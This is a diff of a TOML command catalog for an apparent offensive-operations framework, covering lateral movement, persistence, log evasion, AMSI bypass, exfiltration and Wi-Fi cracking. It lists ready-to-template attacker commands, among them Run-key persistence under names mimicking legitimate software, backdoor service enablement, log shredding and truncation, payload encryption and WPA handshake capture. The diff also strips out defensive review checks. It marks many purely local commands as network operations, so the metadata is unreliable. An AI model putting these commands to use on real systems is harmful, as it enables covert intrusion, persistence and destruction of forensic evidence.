 output = 'lines'
 network = true
 
-[[capability.provider]]
-binary = "whoami"
-[[capability.provider.operation]]
-name = "Current Identity"
-args = []
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "netstat"
-[[capability.provider.operation]]
-name = "Active Connections"
-args = ["-ano"]
-output = "lines"
-network = false
 [[capability]]
 id = 'lateral.remote-execution'
 phase = 'lateral'
@@ -5291,13 +4662,13 @@ binary = 'ip'
 name = 'Route Add'
 args = ['route', 'add', '10.10.10.0/24', 'via', '{pivot}']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Route Show'
 args = ['route', 'show']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'lateral.winrm-remoting'
@@ -5371,7 +4742,7 @@ output = 'lines'
 network = true
 
 [[capability.provider.operation]]
-name = "NetExec Share Listing"
+name = 'Share Listing'
 args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--shares']
 output = 'lines'
 network = true
@@ -5384,7 +4755,7 @@ output = 'lines'
 network = true
 
 [[capability.provider.operation]]
-name = "SMBClient Share Listing"
+name = 'Share Listing'
 args = ['-L', '//{target}', '-U', '{username}%{password}']
 output = 'lines'
 network = true
@@ -5636,7 +5007,7 @@ network = true
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'SOCKS Probe'
-args = ["-x", "socks5h://127.0.0.1:1080", "-s", "-o", "/dev/null", "-I", "http://{target}:8080"]
+args = ['-x', 'socks5h://127.0.0.1:1080', '-s', '-o', '/dev/null', '-w', '%{http_code}', 'http://{target}:8080']
 output = 'lines'
 network = true
 
@@ -5662,37 +5033,25 @@ name = 'Artifact Hash'
 args = ['payload.exe']
 output = 'lines'
 network = false
-[[capability.provider.operation]]
-name = "Log Integrity Hash"
-args = ["{target}"]
-output = "lines"
-network = false
 [[capability.provider]]
 binary = 'journalctl'
 [[capability.provider.operation]]
 name = 'SSH Outbound'
 args = ['_COMM=ssh', '-S', 'today', '--no-pager']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'wevtutil'
 [[capability.provider.operation]]
 name = 'Logon Events'
 args = ['qe', 'Security', '/c:5', '/rd:true', '/f:text']
 output = 'lines'
-network = false
+network = true
 
 # --------------------------------------------------------------------------
 # PERSISTENCE
 # --------------------------------------------------------------------------
 
-[[capability.provider]]
-binary = "ss"
-[[capability.provider.operation]]
-name = "Outbound Connections"
-args = ["-tpn"]
-output = "lines"
-network = false
 [[capability]]
 id = 'persistence.surface-discovery'
 phase = 'persistence'
@@ -5704,21 +5063,21 @@ binary = 'systemctl'
 name = 'Enabled Units'
 args = ['list-unit-files', '--state=enabled', '--type=service']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'systemctl'
 [[capability.provider.operation]]
 name = 'Timer Units'
 args = ['list-timers', '--all']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'crontab'
 [[capability.provider.operation]]
 name = 'User Cron'
 args = ['-l']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'schtasks'
 [[capability.provider.operation]]
@@ -5732,13 +5091,13 @@ binary = 'reg'
 name = 'Run Keys'
 args = ['query', 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'RunOnce Keys'
 args = ['query', 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'persistence.startup-keys'
@@ -5754,24 +5113,19 @@ binary = 'reg'
 name = 'HKCU Run'
 args = ['add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'SecurityHealth', '/t', 'REG_SZ', '/d', '{payload}', '/f']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'HKLM Run'
 args = ['add', 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'AppHelper', '/t', 'REG_SZ', '/d', '{payload}', '/f']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'HKCU RunOnce'
 args = ['add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce', '/v', 'InstallerCheck', '/t', 'REG_SZ', '/d', '{payload}', '/f']
 output = 'lines'
-network = false
-[[capability.provider.operation]]
-name = "Startup Key Inventory"
-args = ["query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]
-output = "lines"
-network = false
+network = true
 [[capability.provider]]
 binary = 'tee'
 [[capability.provider.operation]]
@@ -5786,13 +5140,6 @@ args = ['-a', '/root/.profile']
 output = 'lines'
 network = false
 
-[[capability.provider]]
-binary = "powershell"
-[[capability.provider.operation]]
-name = "Startup Command Review"
-args = ["-NoProfile", "-Command", "Get-CimInstance Win32_StartupCommand"]
-output = "lines"
-network = false
 [[capability]]
 id = 'persistence.service-backdoor'
 phase = 'persistence'
@@ -5846,19 +5193,19 @@ binary = 'systemctl'
 name = 'Unit Enable'
 args = ['enable', '{name}.service']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Unit Start'
 args = ['start', '{name}.service']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Daemon Reload'
 args = ['daemon-reload']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'persistence.scheduled-tasks'
@@ -5900,7 +5247,7 @@ binary = 'crontab'
 name = 'Cron Entry'
 args = ['-l']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'at'
 [[capability.provider.operation]]
@@ -6091,19 +5438,19 @@ binary = 'wevtutil'
 name = 'Channel Config'
 args = ['gl', 'Security']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Sysmon Config'
 args = ['gl', 'Microsoft-Windows-Sysmon/Operational']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Event Query'
 args = ['qe', 'Security', '/c:10', '/rd:true', '/f:text']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'auditctl'
 [[capability.provider.operation]]
@@ -6124,7 +5471,7 @@ binary = 'journalctl'
 name = 'Disk Usage'
 args = ['--disk-usage']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'persistence.log-evasion'
@@ -6140,7 +5487,7 @@ binary = 'shred'
 name = 'Secure Wipe'
 args = ['-u', '-z', '-n', '3', '{target}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'touch'
 [[capability.provider.operation]]
@@ -6163,20 +5510,6 @@ args = ['-s', '0', '{target}']
 output = 'lines'
 network = false
 
-[[capability.provider]]
-binary = "sha256sum"
-[[capability.provider.operation]]
-name = "Log Integrity Hash"
-args = ["{target}"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "stat"
-[[capability.provider.operation]]
-name = "Log Metadata Review"
-args = ["-c", "%A %U %G %y %n", "{target}"]
-output = "lines"
-network = false
 [[capability]]
 id = 'persistence.amsi-bypass'
 phase = 'persistence'
@@ -6198,32 +5531,18 @@ network = true
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
-name = "Python Payload Encoding"
+name = 'Payload Encode'
 args = ['-m', 'base64']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'openssl'
 [[capability.provider.operation]]
-name = "OpenSSL Payload Encryption"
+name = 'Payload Encode'
 args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', 'in.txt', '-out', 'out.enc']
 output = 'lines'
-network = false
+network = true
 
-[[capability.provider]]
-binary = "powershell"
-[[capability.provider.operation]]
-name = "AMSI Configuration Review"
-args = ["-NoProfile", "-Command", "Get-MpPreference"]
-output = "lines"
-network = false
-[[capability.provider]]
-binary = "reg"
-[[capability.provider.operation]]
-name = "Security Configuration Review"
-args = ["query", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender"]
-output = "lines"
-network = false
 [[capability]]
 id = 'persistence.integrity-baseline'
 phase = 'persistence'
@@ -6235,7 +5554,7 @@ binary = 'debsums'
 name = 'Debian Verify'
 args = ['-c']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'rpm'
 [[capability.provider.operation]]
@@ -6428,13 +5747,13 @@ binary = 'ss'
 name = 'Listener Check'
 args = ['-tulpn']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Established Check'
 args = ['-tapn', 'state', 'established']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'curl'
 [[capability.provider.operation]]
@@ -6454,14 +5773,14 @@ binary = 'systemctl'
 name = 'Service Health'
 args = ['status', 'sysupdate.service', '--no-pager']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'crontab'
 [[capability.provider.operation]]
 name = 'Cron Health'
 args = ['-l']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'persistence.cleanup-playbook'
@@ -6491,21 +5810,21 @@ binary = 'debsums'
 name = 'Integrity Compare'
 args = ['-e', '-a']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'bash'
 [[capability.provider.operation]]
 name = 'Rollback Script'
 args = ['-c', 'cat cleanup.sh']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'git'
 [[capability.provider.operation]]
 name = 'Ledger Commit'
 args = ['init']
 output = 'lines'
-network = false
+network = true
 
 # --------------------------------------------------------------------------
 # OBJECTIVES
@@ -6805,7 +6124,7 @@ binary = 'openssl'
 name = 'AES Encrypt'
 args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{staging}/staged.tar.gz', '-out', '{staging}/staged.enc', '-pass', 'pass:{passphrase}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'gpg'
 [[capability.provider.operation]]
@@ -6923,7 +6242,7 @@ binary = 'openssl'
 name = 'Raw TLS Stream'
 args = ['s_client', '-connect', '{endpoint}', '-quiet']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'objectives.covert-exfiltration'
@@ -7090,20 +6409,20 @@ binary = 'journalctl'
 name = 'Unit Export'
 args = ['-u', '{unit}', '--since', '{since}', '-o', 'json']
 output = 'json'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Previous Boot'
 args = ['-b', '-1', '--no-pager']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'wevtutil'
 [[capability.provider.operation]]
 name = 'Channel Export'
 args = ['epl', 'Security', '{directory}/security.evtx']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'ausearch'
 [[capability.provider.operation]]
@@ -7239,7 +6558,7 @@ binary = 'openssl'
 name = 'Detached Signature'
 args = ['dgst', '-sha512', '-sign', '{operator}.key', '-out', '{artifact}.sig', '{artifact}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'gpg'
 [[capability.provider.operation]]
@@ -7260,7 +6579,7 @@ binary = 'git'
 name = 'Ledger Commit'
 args = ['-c', 'commit.gpgsign=true', 'commit', '-m', 'custody']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'objectives.objective-reporting'
@@ -7327,19 +6646,19 @@ binary = 'rfkill'
 name = 'List Radios'
 args = ['list']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Unblock Wifi'
 args = ['unblock', 'wifi']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Unblock All'
 args = ['unblock', 'all']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'airmon-ng'
 [[capability.provider.operation]]
@@ -7365,38 +6684,38 @@ binary = 'iw'
 name = 'Device Info'
 args = ['dev']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Set Monitor'
 args = ['dev', '{interface}', 'set', 'type', 'monitor']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Monitor Detail'
 args = ['dev', '{monitor}', 'info']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'ip'
 [[capability.provider.operation]]
 name = 'Link Down'
 args = ['link', 'set', '{interface}', 'down']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Link Up'
 args = ['link', 'set', '{interface}', 'up']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Link Show'
 args = ['link', 'show', '{monitor}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'iwconfig'
 [[capability.provider.operation]]
@@ -7459,13 +6778,13 @@ binary = 'nmcli'
 name = 'Wifi List'
 args = ['-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 'device', 'wifi', 'list']
 output = 'lines'
-network = false
+network = true
 
 [[capability.provider.operation]]
 name = 'Wifi Rescan'
 args = ['device', 'wifi', 'rescan']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'wavemon'
 [[capability.provider.operation]]
@@ -7526,7 +6845,7 @@ binary = 'iw'
 name = 'Hardware Detail'
 args = ['phy', 'info']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'wireless.handshake-capture'
@@ -7568,7 +6887,7 @@ binary = 'tshark'
 name = 'EAPOL Verify'
 args = ['-r', '{pcap}', '-Y', 'eapol']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'mdk4'
 [[capability.provider.operation]]
@@ -7600,7 +6919,7 @@ binary = 'hcxpcapngtool'
 name = 'Hash Conversion'
 args = ['-o', '{hashes}', '{pcapng}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'hcxhashtool'
 [[capability.provider.operation]]
@@ -7667,7 +6986,7 @@ binary = 'tshark'
 name = 'Challenge Extract'
 args = ['-r', '{capture}', '-Y', 'eap']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
 id = 'wireless.probe-snooping'
@@ -7692,14 +7011,14 @@ binary = 'tshark'
 name = 'Probe Extract'
 args = ['-i', '{monitor}', '-Y', 'wlan.fc.type_subtype==4']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'BPF Probe'
 args = ['-i', '{monitor}', '-w', '{capture}', 'type', 'mgt', 'subtype', 'probe-req']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'kismet_server'
 [[capability.provider.operation]]
@@ -7752,14 +7071,14 @@ binary = 'tshark'
 name = 'Traffic Analysis'
 args = ['-r', '{pcap}', '-Y', 'http.request']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Packet Summary'
 args = ['-r', '{pcap}', '-nn']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'packetspammer'
 [[capability.provider.operation]]
@@ -7846,7 +7165,7 @@ binary = 'ip'
 name = 'Route Table'
 args = ['route', 'show']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'traceroute'
 [[capability.provider.operation]]
@@ -7939,7 +7258,7 @@ binary = 'iw'
 name = 'Set Width'
 args = ['dev', '{monitor}', 'set', 'channel', '36', 'HT40+']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'wavemon'
 [[capability.provider.operation]]
@@ -7971,14 +7290,14 @@ binary = 'hcxpcapngtool'
 name = 'Hash Extract'
 args = ['-o', 'pcap_hashes.22000', '{capture}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Management Filter'
 args = ['-r', '{capture}', '-Y', '{filter}', '-w', '{output}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'mergecap'
 [[capability.provider.operation]]
@@ -8117,7 +7436,7 @@ binary = 'aircrack-ng'
 name = 'Strength Verify'
 args = ['{hashes}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
@@ -8138,7 +7457,7 @@ binary = 'tshark'
 name = 'Cipher Summary'
 args = ['-r', 'capture.pcap', '-Y', 'wlan.rsn']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
